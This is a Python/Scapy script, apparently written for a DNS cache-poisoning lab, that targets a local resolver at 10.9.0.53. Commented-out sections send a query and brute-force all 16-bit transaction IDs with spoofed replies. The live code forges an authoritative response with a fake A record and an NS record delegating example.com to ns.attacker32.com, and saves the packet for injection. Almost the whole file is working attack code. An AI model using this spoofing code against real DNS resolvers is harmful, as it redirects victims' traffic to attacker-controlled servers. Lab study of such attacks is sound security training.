# from scapy.all import *
#
#
# # Construct DNS request for ns.attacker32.com or www.attacker32.com
# def send_dns_request():
#     qname = "www.attacker32.com"
#     dns_request = IP(dst="10.9.0.53") / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
#
#     print(f"Sending DNS request for {qname} to 10.9.0.53")
#     response = sr1(dns_request, verbose=1, timeout=2)  # Wait for a single response
#
#     if response:
#         print("Received a response:")
#         response.show()
#     else:
#         print("No response received.")
#
#
# if __name__ == "__main__":
#     send_dns_request()





#
# from scapy.all import *
# from scapy.layers.dns import DNS, DNSQR, DNSRR
# from scapy.layers.inet import UDP
# import string
#
#
# def send_spoofed_response(dns_id, qname):
#     attacker_ns = "ns.attacker32.com"
#     fake_ip = "1.2.3.5"
#
#     dns_response = (
#         IP(dst="10.9.0.53", src="93.184.216.34") /  # Impersonate example.com's nameserver
#         UDP(dport=33333, sport=53) /  # Use fixed source port 33333 as configured
#         DNS(
#             id=dns_id,
#             qr=1,  # This is a response
#             aa=1,  # Authoritative answer
#             rd=1,  # Recursion desired
#             ra=1,  # Recursion available
#             qd=DNSQR(qname=qname),
#             an=DNSRR(rrname=qname, type='A', ttl=300, rdata=fake_ip),
#             ns=DNSRR(rrname="example.com", type='NS', ttl=300, rdata=attacker_ns)
#         )
#     )
#
#     send(dns_response, verbose=0)
#
# if __name__ == "__main__":
#     while True:
#         random_subdomain = ''.join(random.choices(string.ascii_lowercase, k=5))
#         qname = f"{random_subdomain}.example.com"
#         for dns_id in range(0, 65536):  # 16-bit transaction ID
#             send_spoofed_response(dns_id, qname)



from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP


def send_spoofed_response():
    # attacker_ns = "ns.attacker32.com"
    # fake_ip = "1.2.3.5"
    # qname = "abcde.example.com"  # Target the correct domain

    # dns_response = (
    #     IP(dst="10.9.0.53", src="199.43.133.53") /  # Impersonate example.com's nameserver
    #     UDP(dport=33333, sport=53) /  # Use fixed source port 33333 as configured
    #     DNS(
    #         id=0xAAAA,
    #         qr=1,  # This is a response
    #         aa=1,  # Authoritative answer
    #         rd=1,  # Recursion desired
    #         ra=1,  # Recursion available
    #         qd=DNSQR(qname=qname),
    #         an=DNSRR(rrname=qname, type='A', ttl=259200, rdata=fake_ip),
    #         ns=DNSRR(rrname="example.com", type='NS', ttl=259200, rdata=attacker_ns)
    #     )
    # )

    name = "abcde.example.com"
    domain = "example.com"
    ns = "ns.attacker32.com"
    Qdsec = DNSQR(qname=name)
    Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
    NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
    dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
    ip = IP(dst="10.9.0.53", src="199.43.133.53")
    udp = UDP(dport=33333, sport=53, chksum=0)
    reply = ip/udp/dns


    with open("ip_resp.bin", "wb") as file:
        file.write(bytes(reply))

    # send(dns_response, verbose=0)  # Send the response without delay


if __name__ == "__main__":
    # for dns_id in range(0, 65536):  # Loop through all possible transaction IDs
    send_spoofed_response()